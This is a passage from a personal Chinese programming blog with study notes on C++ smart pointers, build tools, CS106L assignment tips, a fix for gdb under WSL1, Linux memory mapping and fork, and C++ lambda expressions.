class="line">    std::weak_ptr&lt;<span class="type">int</span>&gt; weak = shared; <span class="comment">// 不增加引用计数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">auto</span> ptr = weak.<span class="built_in">lock</span>()) { <span class="comment">// 检查资源是否仍然存在</span></span><br><span class="line">        std::cout &lt;&lt; <span class="string">"Value: "</span> &lt;&lt; *ptr &lt;&lt; std::endl;</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        std::cout &lt;&lt; <span class="string">"Resource no longer exists."</span> &lt;&lt; std::endl;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    shared.<span class="built_in">reset</span>(); <span class="comment">// 释放资源</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">auto</span> ptr = weak.<span class="built_in">lock</span>()) {</span><br><span class="line">        std::cout &lt;&lt; <span class="string">"Value: "</span> &lt;&lt; *ptr &lt;&lt; std::endl;</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        std::cout &lt;&lt; <span class="string">"Resource no longer exists."</span> &lt;&lt; std::endl;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p><strong>优点</strong></p>
<ul>
<li>用于解决 <code>std::shared_ptr</code> 循环引用问题。</li>
<li>允许访问资源但不拥有资源，不影响引用计数。</li>
</ul>
<p><strong>缺点</strong></p>
<ul>
<li>只能与 <code>std::shared_ptr</code> 搭配使用，单独意义不大。</li>
</ul>
<h2 id="makefiles-和-cmake">Makefiles 和 CMake</h2>
<h3 id="makefile"><strong>1. Makefile</strong></h3>
<ul>
<li><code>Makefile</code> 是用于 <code>make</code>
工具的配置文件，它定义了一系列规则，告诉编译器如何生成目标文件。</li>
<li>本质上是手写的构建规则，直接调用编译器命令。</li>
</ul>
<h3 id="cmake"><strong>2. CMake</strong></h3>
<p>需要编写编写 <code>CMakeLists.txt</code></p>
<ul>
<li><code>CMake</code>
是一种跨平台的构建系统生成工具，它可以生成不同平台上的项目文件（如
<code>Makefile</code>、Visual Studio 的项目文件）。</li>
<li><code>CMake</code> 本质上是为大型项目提供了高层次的抽象。</li>
</ul>
<h2 id="assignment">Assignment</h2>
<p>参考资料：https://www.zhihu.com/column/c_1839339107211419649</p>
<h3 id="assignment-1">Assignment 1</h3>
<ul>
<li><p>在迭代 <code>std::vector</code>
时，不建议直接修改当前遍历的容器（如删除元素）。一种常见的做法是使用
<strong>后向迭代</strong> 或者
<strong>标记删除</strong>，然后在迭代完成后删除元素。</p>
<p>但是这里不能使用反向迭代，会导致文件内容与正确文件内容不匹配（倒序，从最后一行往第一行读取内容），所以这里定义了一个中间变量存放待删除的元素。</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">std::vector&lt;Course&gt; tmp; <span class="comment">// 存放待删除的元素</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> c: all_courses) {</span><br><span class="line">    <span class="keyword">if</span>(c.quarter != <span class="string">"null"</span>) {</span><br><span class="line">        ofile &lt;&lt; c.title &lt;&lt; <span class="string">","</span> &lt;&lt; c.number_of_units &lt;&lt; <span class="string">","</span> &lt;&lt; c.quarter &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">        tmp.<span class="built_in">push_back</span>(c);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> t: tmp) {</span><br><span class="line">    <span class="built_in">delete_elem_from_vector</span>(all_courses, t);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<p>创建了一个临时容器
<code>tmp</code>，并在遍历过程中把要删除的元素放入其中。遍历完后，再通过
<code>delete_elem_from_vector</code> 从 <code>all_courses</code>
中删除这些元素。这样可以避免在原容器上进行删除操作时改变容器的大小或顺序，从而避免迭代器失效的问题。</p>
</blockquote></li>
</ul>
<h3 id="assignment-2">Assignment 2</h3>
<p>需要注意作业要求获取 first name 和 last name
的两个首字母，两个都必须参与比较，可以单独写一个函数记录两个字母，然后进行比较</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">std::string <span class="title">get_initials</span><span class="params">(std::string name)</span> </span>{</span><br><span class="line">  <span class="comment">// 初始化结果字符串</span></span><br><span class="line">    std::string res;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取第一个字母</span></span><br><span class="line">    res += name[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找空格位置</span></span><br><span class="line">    <span class="type">size_t</span> space_pos = name.<span class="built_in">find</span>(<span class="string">' '</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果找到了空格，获取空格后第一个字母</span></span><br><span class="line">    <span class="keyword">if</span> (space_pos != std::string::npos &amp;&amp; space_pos + <span class="number">1</span> &lt; name.<span class="built_in">size</span>()) {</span><br><span class="line">        res += name[space_pos + <span class="number">1</span>];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function">std::queue&lt;<span class="type">const</span> std::string*&gt; <span class="title">find_matches</span><span class="params">(std::string name, std::unordered_set&lt;std::string&gt;&amp; students)</span> </span>{</span><br><span class="line">  <span class="comment">// STUDENT <span class="doctag">TODO:</span> Implement this function.</span></span><br><span class="line">  std::queue&lt;<span class="type">const</span> std::string*&gt; q;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span> it = students.<span class="built_in">begin</span>(); it != students.<span class="built_in">end</span>(); ++it) {</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">get_initials</span>(*it) == <span class="built_in">get_initials</span>(kYourName))</span><br><span class="line">      q.<span class="built_in">push</span>(&amp;(*it)); <span class="comment">// 先解引用it得到字符串，然后再获取该字符串的地址</span></span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> q;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h3 id="assignment-3">Assignment 3</h3>
<p>CastXML环境有问题，无法生成xml文件导致无法测评</p>
<h3 id="assignment-4">Assignment 4</h3>
<p>主要用到下面这几个函数：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">std::<span class="built_in">min_element</span>( ForwardIt first, ForwardIt last );</span><br><span class="line">std::<span class="built_in">accumulate</span>(InputIt first, InputIt last, T init); <span class="comment">// 这里的init是初始值</span></span><br><span class="line">std::<span class="built_in">max_element</span>( ForwardIt first, ForwardIt last );</span><br><span class="line"></span><br><span class="line">std::<span class="built_in">transform</span>( InputIt first1, InputIt last1, OutputIt d_first, UnaryOp unary_op ); <span class="comment">// 第四个参数可用lambda表达式</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//std::remove_if 它会 重新排列 指定范围内的元素，使所有 不符合 给定条件的元素排在前面，并返回一个新的 尾部迭代器，指向重新排列后的有效范围的末尾。</span></span><br><span class="line">std::<span class="built_in">remove_if</span>(ForwardIt first, ForwardIt last, UnaryPred p); <span class="comment">// p函数的返回值一般是布尔值</span></span><br><span class="line"></span><br><span class="line">std::erase <span class="comment">// 能够真正删除元素，可与remove_if配合使用</span></span><br></pre></td></tr></tbody></table></figure>
<p>还需注意<code>const</code>的使用，有些函数的参数不能使用<code>const</code>类型变量。</p>
<blockquote>
<p>如果出现以下报错，则在对应的文件打开函数中添加编码参数，例如：<code>open(file_path, "r", encoding="utf-8")</code></p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File "D:\ComputerScience\CS106L\cs106l-assignments\assign4\autograder\autograder.py", line 181, in &lt;module&gt;</span><br><span class="line">    add_matcher_tests(grader)</span><br><span class="line">  File "D:\ComputerScience\CS106L\cs106l-assignments\assign4\autograder\autograder.py", line 138, in add_matcher_tests     </span><br><span class="line">    student_methods = parse_methods(MAIN_CPP_PATH)</span><br><span class="line">                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File "D:\ComputerScience\CS106L\cs106l-assignments\assign4\autograder\autograder.py", line 97, in parse_methods</span><br><span class="line">    content = file.read()</span><br><span class="line">              ^^^^^^^^^^^</span><br><span class="line">UnicodeDecodeError: 'gbk' codec can't decode byte 0xa8 in position 693: illegal multibyte sequence</span><br></pre></td></tr></tbody></table></figure>
</blockquote>
<h3 id="assignment-5">Assignment 5</h3>
<p>第二部分中注意：对于拷贝构造函数，如果类包含动态数组（即指针指向的堆内存），必须单独为数组分配新内存，并拷贝内容，而不是仅仅赋值指针，否则会引发
浅拷贝（shallow copy） 问题</p>
<h3 id="assignment-6">Assignment 6</h3>
<p>考察的知识点是<code>std::optional</code>，可参考上面的笔记</p>
<h3 id="assignment-7">Assignment 7</h3>
<p><strong>需要使用 <code>std::move</code>
来显式触发移动构造函数和移动赋值运算符</strong></p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 触发移动构造函数</span></span><br><span class="line"><span class="function">MyClass <span class="title">obj1</span><span class="params">(<span class="number">42</span>)</span></span>;</span><br><span class="line">MyClass obj2 = std::<span class="built_in">move</span>(obj1); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 触发移动赋值运算符</span></span><br><span class="line"><span class="function">MyClass <span class="title">obj1</span><span class="params">(<span class="number">42</span>)</span></span>;</span><br><span class="line"><span class="function">MyClass <span class="title">obj2</span><span class="params">(<span class="number">100</span>)</span></span>;</span><br><span class="line">obj2 = std::<span class="built_in">move</span>(obj1);  </span><br></pre></td></tr></tbody></table></figure>
<p>这里还需要使用反向迭代器（reverse_iterator）来实现倒序遍历（逆序遍历），<code>rbegin()</code>指向容器的最后一个元素
<code>rend()</code> 指向容器的前一个位置（即
<code>begin() - 1</code>），下面是相关代码</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> i = values.<span class="built_in">rbegin</span>(); i != values.<span class="built_in">rend</span>(); ++i) {</span><br><span class="line">    unique_ptr&lt;ListNode&lt;T&gt;&gt; node = <span class="keyword">new</span> <span class="built_in">ListNode</span>&lt;T&gt;(*i);</span><br><span class="line">    node-&gt;next = std::<span class="built_in">move</span>(head);</span><br><span class="line">    head = std::<span class="built_in">move</span>(node);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/04/gdb%E5%9C%A8WSL1%E4%B8%AD%E6%8A%A5%E9%94%99/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/01/04/gdb%E5%9C%A8WSL1%E4%B8%AD%E6%8A%A5%E9%94%99/" class="post-title-link" itemprop="url">gdb在WSL1中报错解决方案</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2025-01-04 00:00:00 / 修改时间：16:58:12" itemprop="dateCreated datePublished" datetime="2025-01-04T00:00:00+08:00">2025-01-04</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/WSL/" itemprop="url" rel="index"><span itemprop="name">WSL</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>550</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>我的环境如下：</p>
<figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\hxt&gt; wsl <span class="literal">--list</span> <span class="literal">--verbose</span></span><br><span class="line">  NAME      STATE           VERSION</span><br><span class="line">* Ubuntu    Stopped         <span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>
<p>我想要在该环境下调试一个cpp文件，但是报错：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b 6</span><br><span class="line">Breakpoint 1 at 0x1224: file cin_2.cpp, line 7.</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /home/hxt/test_code/cin_2</span><br><span class="line">warning: opening /proc/PID/mem file for lwp 399.399 failed: No such file or directory (2)</span><br><span class="line">Warning:</span><br><span class="line">Cannot insert breakpoint 1.</span><br><span class="line">Cannot access memory at address 0x8001224</span><br></pre></td></tr></tbody></table></figure>
<p>经过搜索发现WSL1（Windows Subsystem for
Linux）中没有对<code>/proc/PID/mem</code>提供支持，导致GDB在尝试访问该文件时出错。老版本的GDB在找不到<code>/proc/PID/mem</code>文件时会使用
ptrace，而新版本的GDB则禁用了这种机制。这里是<a target="_blank" rel="noopener" href="https://github.com/microsoft/WSL/issues/8356">相关讨论和不同解决方案</a>。</p>
<p><strong>我的解决方案</strong>是将WSL1升级到WSL2，使用命令<code>wsl --set-version &lt;发行版名称&gt; 2</code>，问题解决。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/12/17/%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/12/17/%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84/" class="post-title-link" itemprop="url">内存映射</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-12-17 00:00:00" itemprop="dateCreated datePublished" datetime="2024-12-17T00:00:00+08:00">2024-12-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-03-02 00:52:42" itemprop="dateModified" datetime="2025-03-02T00:52:42+08:00">2025-03-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" itemprop="url" rel="index"><span itemprop="name">操作系统</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>1.4k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>内存映射分为普通文件和匿名文件，这里讨论的是Linux环境</p>
<h2 id="文件映射file-mapping">文件映射（File Mapping）</h2>
<h3 id="普通文件">普通文件</h3>
<p>将<strong>普通磁盘文件</strong>的某个区域映射到进程的虚拟内存空间。</p>
<h4 id="工作原理">工作原理</h4>
<ul>
<li><strong>页面划分</strong>：文件内容被划分成页面大小（通常为4KB）的片段，每个片段对应虚拟内存中的一个页面。</li>
<li>按需加载（Demand Paging）：
<ul>
<li>初始时，文件内容并不会全部加载到物理内存中。</li>
<li>当CPU<strong>首次</strong>访问某个虚拟页面时，操作系统才将文件对应的页面<strong>从磁盘加载到物理内存</strong>。</li>
</ul></li>
<li><strong>超出文件区域</strong>：若映射区域大于文件大小，超出部分会被<strong>零填充</strong>（Padding
with zeros）。</li>
</ul>
<h4 id="特点">特点</h4>
<ul>
<li>文件的内容直接与虚拟内存对应，可进行高效的文件I/O操作。</li>
<li>用于<strong>程序执行</strong>（如加载可执行文件）或实现<strong>文件共享</strong>。</li>
</ul>
<h3 id="匿名文件">匿名文件</h3>
<p>将一片<strong>不关联磁盘文件</strong>的内存区域映射到进程的虚拟地址空间。这种区域内容初始化为<strong>全零</strong>，由内核创建的<strong>匿名文件</strong>管理。匿名文件的内容全部由<strong>二进制零</strong>组成，因此它是<strong>空白的</strong>、未初始化的。</p>
<h4 id="工作原理-1">工作原理</h4>
<ul>
<li>按需分配：
<ul>
<li>初始时，匿名映射区域并不占用物理内存。</li>
<li>当CPU首次访问某个虚拟页面时，内核会分配一个<strong>物理页面</strong>，并将其内容填充为<strong>二进制零</strong>。</li>
</ul></li>
<li>只有当CPU第一次访问某个虚拟页面时（即“触摸”该页面），内核才会进行以下操作：
<ol type="1">
<li><strong>选择一个牺牲页面</strong>（Victim
Page）：从物理内存中找到一个适合被替换的页面。</li>
<li><strong>交换脏页面</strong>（如有必要）：如果选中的页面是<strong>脏页面</strong>（内容被修改过但尚未写回磁盘），内核会先将其内容写回磁盘。</li>
<li><strong>填充零值</strong>：内核将物理页面的内容全部填充为<strong>二进制零</strong>。</li>
<li><strong>更新页表</strong>：内核将虚拟页面与新分配的物理页面关联起来，并将页面标记为<strong>已驻留</strong>（Resident）。</li>
</ol></li>
</ul>
<h4 id="特点-1">特点</h4>
<ul>
<li>适用于分配需要初始化为零的内存区域，例如堆内存、栈内存。</li>
<li>不涉及磁盘文件，因此无需磁盘I/O。</li>
<li>由于这种机制不会涉及磁盘和内存之间的数据传输，内核只是在分配物理页面时填充零值，因此这类页面被称为<strong>需求零页面</strong>（Demand-Zero
Pages）。</li>
</ul>
<h2 id="fork-函数">fork 函数</h2>
<p><strong>1. 调用 <code>fork()</code> 时的内存复制：</strong></p>
<ul>
<li><p>在调用 <code>fork()</code>
时，操作系统并不会立即复制整个父进程的内存空间，而是通过<strong>写时复制（Copy-On-Write,
COW）机制</strong>优化内存使用。</p>
<blockquote>
<p><strong>写时复制</strong>只有在任⼀进程（⽗进程或⼦进程）对数据执⾏了写操作时，复制才会发⽣（先是缺⻚中断，然后操作系统给⼦进程分配内存并复制⽗进程的数据）</p>
</blockquote></li>
<li><p>父子进程会<strong>共享同一块物理内存页面</strong>（只读）。</p></li>
<li><p>只有当父进程或子进程尝试修改内存时，写时复制机制会为对应的进程创建一个新页面，从而为每个进程保持了私有地址空间的抽象概念。</p></li>
</ul>
<p><strong>2. 创建子进程：</strong></p>
<ul>
<li>内核会为子进程分配一个新的<strong>进程控制块（PCB）</strong>，用于存储子进程的状态信息。</li>
<li>子进程获得与父进程相同的内存空间（通过 COW 实现共享）。</li>
<li>子进程会继承父进程的大部分资源，例如：
<ul>
<li>程序代码（代码段）</li>
<li>堆、栈（通过 COW 共享）</li>
<li>打开的文件描述符</li>
<li>环境变量等</li>
</ul></li>
</ul>
<p><strong>3. 返回值不同：</strong></p>
<ul>
<li><code>fork()</code>在父进程和子进程中都会返回：
<ul>
<li>在<strong>父进程</strong>中，<code>fork()</code>
返回<strong>子进程的PID</strong>。</li>
<li>在<strong>子进程</strong>中，<code>fork()</code>
返回<strong>0</strong>。</li>
<li>如果 <code>fork()</code> 失败，返回
<strong>-1</strong>，表示子进程创建失败。</li>
</ul></li>
</ul>
<p>通过返回值的不同，程序可以判断当前正在运行的是父进程还是子进程。</p>
<p><strong>4. 进程调度：</strong></p>
<ul>
<li>父进程和子进程会被操作系统调度器视为两个独立的进程，独立运行。</li>
<li>由于父子进程共享同一个代码段，它们可以执行不同的代码路径（如通过
<code>if</code> 判断 <code>fork()</code> 返回值）。</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/12/02/lambda%E8%A1%A8%E8%BE%BE%E5%BC%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/12/02/lambda%E8%A1%A8%E8%BE%BE%E5%BC%8F/" class="post-title-link" itemprop="url">lambda表达式</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-12-02 00:00:00" itemprop="dateCreated datePublished" datetime="2024-12-02T00:00:00+08:00">2024-12-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-01-23 00:31:45" itemprop="dateModified" datetime="2025-01-23T00:31:45+08:00">2025-01-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CPP/" itemprop="url" rel="index"><span itemprop="name">CPP</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>1.8k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>内容参考《C++ primer》</p>
<h2 id="定义">定义</h2>
<ul>
<li><p>一个lambda表达式表示一个可调用的代码单元。我们可以将其理解为一个未命名的
内联函数。</p></li>
<li><p>表达式形式</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[capture list](parameter list) -&gt; return type { function body }</span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<p>lambda表达式必须使用尾置返回，尾置返回示例如下：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// func接受一个int类型的实参，返回一个指针，该指针指向含有10个整数的数组</span></span><br><span class="line"><span class="function"><span class="keyword">auto</span> <span class="title">func</span><span class="params">(<span class="type">int</span> i)</span> -&gt; <span class="title">int</span><span class="params">(*)</span>[10]</span>;</span><br></pre></td></tr></tbody></table></figure>
</blockquote></li>
<li><p>若忽略括号和参数列表，则等价于指定一个空参数列表</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> f = [] { <span class="keyword">return</span> <span class="number">42</span>; };</span><br><span class="line">cout &lt;&lt; <span class="built_in">f</span>() &lt;&lt; endl; <span class="comment">//打印42</span></span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<h3 id="向lambda传递参数">向lambda传递参数</h3>
<ul>
<li><p>包含参数的lambda表达式，可作为<code>find_if</code>函数的一个参数</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[](<span class="type">const</span> string &amp;a, <span class="type">const</span> string &amp;b) { <span class="keyword">return</span> a.<span class="built_in">size</span>() &lt; b.<span class="built_in">size</span>(); }</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<h3 id="使用捕获列表">使用捕获列表</h3>
<ul>
<li><p>lambda表达式通过将局部变量包含在其捕获列表中来指出将会使用这些变量。</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[sz](<span class="type">const</span> string &amp;a) { <span class="keyword">return</span> a.<span class="built_in">size</span>() &gt;= sz; };</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<h2 id="变量的捕获方式">变量的捕获方式</h2>
<h3 id="值捕获">值捕获</h3>
<ul>
<li>lambda采用值捕获的方式。与传值参数类似，采用值捕获的前提是变量可以拷贝。</li>
<li>与参数不同，被捕获的变量的值是在lambda创建时拷贝，而不是调用时拷贝</li>
</ul>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">fcn1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="type">size_t</span> v1 = <span class="number">42</span>; <span class="comment">//局部变量</span></span><br><span class="line">	<span class="comment">//将v1拷贝到名为f的可调用对象</span></span><br><span class="line">	<span class="keyword">auto</span> f = [v1]{ <span class="keyword">return</span> v1; };</span><br><span class="line">	v1 = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">auto</span> j = <span class="built_in">f</span>(); <span class="comment">// j 为 42，f保存了我们创建它时v1的拷贝</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="引用捕获">引用捕获</h3>
<ul>
<li>v1之前的<code>&amp;</code>指出v1应该以引用方式捕获。</li>
<li>当我们在lambda函数体内使用此变量时，实际上使用的是引用所绑定的对象。</li>
<li>在本例中，当lambda返回v1时，它返回的是v1指向的对象的值。</li>
</ul>
